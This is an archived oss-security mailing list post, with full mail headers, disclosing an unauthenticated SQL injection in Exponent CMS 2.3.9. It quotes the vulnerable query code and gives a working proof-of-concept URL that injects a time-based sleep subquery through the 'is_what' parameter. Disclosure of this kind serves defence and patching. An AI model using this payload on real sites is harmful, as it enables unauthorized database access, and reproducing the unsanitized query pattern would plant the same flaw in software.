X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["603" "Monday" "19" "September" "2016" "13:46:34" "+0800" "east wu" "ylgaaaaa@gmail.com" "<CABxEYvnvyroQL2ef7rkmDcoNkLXQOXeLmLsUYYPxvfhwoev0QQ@mail.gmail.com>" "19" "[oss-security] Exponent CMS 2.3.9 SQL injection vulnerabilities" "^Cc:" nil nil "9" "2016091905:46:34" "[oss-security] Exponent CMS 2.3.9 SQL injection vulnerabilities" (number mark "U       ylgaaaaa@gma Sep 19   19/603   " thread-indent "\"[oss-security] Exponent CMS 2.3.9 SQL injection vulnerabilities\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 26049 invoked by uid 550); 19 Sep 2016 11:52:13 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 32065 invoked from network); 19 Sep 2016 05:46:46 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:from:date:message-id:subject:to:cc;
        bh=qLV/KD0cugcf/8PamudfQaS1PX2mdFpUtGkc3JMT84M=;
        b=czOazhYK101lJxHVW3o4My3jjcnNqVr7EjFz6EJKeb14KJQFAhrt2OQhGk57pCOpsq
         5r0p70LfAhtGn1EKZQUfMQK/4KTOJd3YRloEDVXMF7O4cXLbAIpavy4YiplPIUzqh6en
         MnKceWxX5ZeR86w+nimipQu3WOtGTFHmoBIy6KiDQUtBLRYq20ikiCTuSJuBNs2/KgnK
         FO29uSE37CCEtL62cdeQWe1ED/0ao5q9qWe227H0YzGurUMwmSOOdqeeJ1KujSHDRH67
         CVoYohA5FMmqIIH1zg7wHcSDy9zpLy1W9QtiOqhC1xCFH/eZB9V04OyTU8Tg/baZ9Bo/
         nzzw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to:cc;
        bh=qLV/KD0cugcf/8PamudfQaS1PX2mdFpUtGkc3JMT84M=;
        b=TRvbSJmmSEaR13ppM2Ef6/VAGrL0W19ipJc98mmaIgOibxrOdryqHLlDukQv9Z/1m1
         2Mt4n00dRAamtCtg1koWGSae9XX/95DST7BBBDdbv/xA2Z7KY3/BmRZumTdyj3ZaHnxF
         6TEYreOMe9M03JwldfvuQk3TlS30J06t13Eta5fgvd4bcbf12EajfpXn/muV8++9XbVV
         P2MdzGSRgmXw3lGVUE5upMmFBBvzYczQhZ6YUfaIM1F3bSa2pWD8iWjDzJebd79Dvpln
         Hwe/nrtmoIoiav3N2DRiEm5pYoQ0vkvYmaYse/FLrX89psAitP+nivIkghVvLSX4HJVV
         9lqQ==
X-Gm-Message-State: AE9vXwPYXfYvxwNHt9tlBkCRp3gj5eo88pIjq6HnlEEvmPWmWSewxkDvOQtGFMvksAEgyj9zwm3rW/hvY5k4Uw==
X-Received: by 10.202.190.215 with SMTP id o206mr28705542oif.76.1474263994574;
 Sun, 18 Sep 2016 22:46:34 -0700 (PDT)
MIME-Version: 1.0
Message-ID: <CABxEYvnvyroQL2ef7rkmDcoNkLXQOXeLmLsUYYPxvfhwoev0QQ@mail.gmail.com>
Content-Type: multipart/alternative; boundary=001a113dc528b3b51c053cd5d5b2
Cc: cve-assign@mitre.org
Date: Mon, 19 Sep 2016 13:46:34 +0800
From: east wu <ylgaaaaa@gmail.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Exponent CMS 2.3.9 SQL injection vulnerabilities
To: oss-security@lists.openwall.com

--001a113dc528b3b51c053cd5d5b2
Content-Type: text/plain; charset=UTF-8

https://github.com/exponentcms/exponent-cms/blob/master/framework/modules/
addressbook/controllers/addressController.php#L172

'is_what' parameter there is an injection without login


https://github.com/exponentcms/exponent-cms/blob/master/framework/core/subsystems/expDatabase.php#L559

$this->sql("UPDATE " . $this->prefix . $table . " SET " . $col . "=0 WHERE "
. $where);

POC:
/index.php?controller=address&action=activate_address&is_what=address1=(select
* from (select sleep(5))x)%23&id=1

--001a113dc528b3b51c053cd5d5b2--
